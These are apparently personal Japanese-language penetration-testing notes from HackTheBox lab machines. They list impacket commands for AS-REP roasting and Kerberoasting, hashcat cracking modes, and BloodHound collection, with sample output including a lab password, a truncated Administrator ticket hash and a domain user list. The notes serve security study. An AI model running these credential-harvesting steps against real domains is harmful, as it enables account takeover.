## GetNPUsers.py (AS_REProast)

ASREPRoast攻撃により**Kerberos事前認証が不要**なユーザーを探索しそのパスワードハッシュの取得を狙う。

```
# specific user 
┌──(kali㉿kali)-[~]
└─$ impacket-GetNPUsers.py -no-pass -dc-ip 10.10.10.52 htb.local/mantis

# Using user list
┌──(kali㉿kali)-[~]
└─$ GetNPUsers.py htb.local/ -no-pass -dc-ip 10.10.10.161 -usersfile users.txt 
```

**krb5asrep**ハッシュのクラック：

```
┌──(kali㉿kali)-[~]
└─$ hashcat -a 0 -m 18200 hash /usr/share/wordlists/rockyou.txt
```

## Blood Hound from "LOCAL"

```
┌──(kali㉿kali)-[~]
└─$ bloodhound-python -u <domain account> -p <account's password> -ns <target's IP> -d <Domain> -c All

(e.g.) $ loodhound-python -u svc_tgs -p GPPstillStandingStrong2k18 -ns 10.10.10.100 -d active.htb -c All
```

## GetUserSPNs.py
（指定したドメインアカウント下で動いてるSPN（Service Principal Name）を探す。）

Kerberoastableユーザのハッシュをとる。

- -reqeust: TGS（サービスチケットを発行するサーバ）にリクエストを出す
- -save: TGSを保存する（<username>.ccacheのフォーマット）

```
┌──(kali㉿kali)-[~]
└─$ GetUserSPNs.py -request -dc-ip <target IP> <domain>/<user name> -save -outputfile GetUserSPNs.out

(e.g.) $ GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS -save -outputfile GetUserSPNs.out
```
  
(c.f. [0xdf hacks stuff](https://0xdf.gitlab.io/2018/12/08/htb-active.html#decrypting-gpp-password))

> I’ll use the GetUserSPNs.py script from Impacket to get a list of service usernames which are associated with normal user accounts. 
It will also get a ticket that I can crack. 
  
***GetUserSPNs.pyの結果Administratorのハッシュが取れた！！！***
  
```
┌──(kali㉿kali)-[~]
└─$ ls
Administrator.acache
GetUserSPNs.out
  
┌──(kali㉿kali)-[~]
└─$ cat GetUserSPNs.out
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$25bac967bc8a16...
```
  
注意）このハッシュは（**krb5tgs**）のhashcatでは「-m 13100」。ハッシュタイプ18200はAS_Repのハッシュ。

  
### GetNPUsers.pyとGetUserSPNs.pyについて
#### GetNPUsers.py -> "AS_REPRoasting"（存在するユーザ名のみでOK）
-> ASREPRoastingとは、ケルベロスチケットを要求する際にpre-authenticationを必要としないようなアカウントに対して、"Does not require Pre-Authentication"なる権限を持っている場合に起こる。

  
#### GetUserSPNs.py -> "TGS_REPRoasting"（存在するユーザ名とそのパスワード（それなりの権限が必要かも））
-> そのドメイン内のアカウントのクリデンシャルを知っていれば、それは普通にTGSに対して要求できるでしょ。で、その**TGS_REPにはSPNのハッシュが含まれている**。これをofflineでクラックすると。（Activeの場合は、AdministratorがSPNに関連してたのがセキュリティホールかな）

# GetADUser
そのADのユーザ一覧表示（1人分のcredentialがあればできる）
 ```
  ┌──(shoebill㉿shoebill)-[~/Support_10.10.11.174/LocalBloodHound]
└─$ impacket-GetADUsers -all support.htb/ldap -dc-ip 10.10.11.174                                                                                130 ⨯
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
[*] Querying 10.10.11.174 for information about domain.
Name                  Email                           PasswordLastSet      LastLogon           
--------------------  ------------------------------  -------------------  -------------------
Administrator                                         2022-07-20 02:55:56.729359  2022-10-07 13:29:51.666899 
Guest                                                 2022-05-28 20:18:55.212082  <never>             
krbtgt                                                2022-05-28 20:03:43.762633  <never>             
ldap                                                  2022-05-28 20:11:46.462052  2022-10-07 16:50:43.791910 
support                                               2022-05-28 20:12:00.977707  <never>             
smith.rosario         smith.rosario@support.htb       2022-05-28 20:12:19.305799  <never>             
hernandez.stanley     hernandez.stanley@support.htb   2022-05-28 20:12:34.870818  <never>             
wilson.shelby         wilson.shelby@support.htb       2022-05-28 20:12:50.352678  <never>             
anderson.damian       anderson.damian@support.htb     2022-05-28 20:13:05.993295  <never>             
thomas.raphael        thomas.raphael@support.htb      2022-05-28 20:13:21.774558  <never>             
levine.leopoldo       levine.leopoldo@support.htb     2022-05-28 20:13:37.508924  <never>             
raven.clifton         raven.clifton@support.htb       2022-05-28 20:13:53.133921  <never>             
bardot.mary           bardot.mary@support.htb         2022-05-28 20:14:08.633925  <never>             
cromwell.gerard       cromwell.gerard@support.htb     2022-05-28 20:14:24.258920  <never>             
monroe.david          monroe.david@support.htb        2022-05-28 20:14:39.712058  <never>             
west.laura            west.laura@support.htb          2022-05-28 20:14:55.446424  <never>             
langley.lucy          langley.lucy@support.htb        2022-05-28 20:15:10.930801  <never>             
daughtler.mabel       daughtler.mabel@support.htb     2022-05-28 20:15:26.274558  <never>             
stoll.rachelle        stoll.rachelle@support.htb      2022-05-28 20:15:42.290214  <never>             
ford.victoria         ford.victoria@support.htb       2022-05-28 20:15:58.118301  <never> 
 ```
  
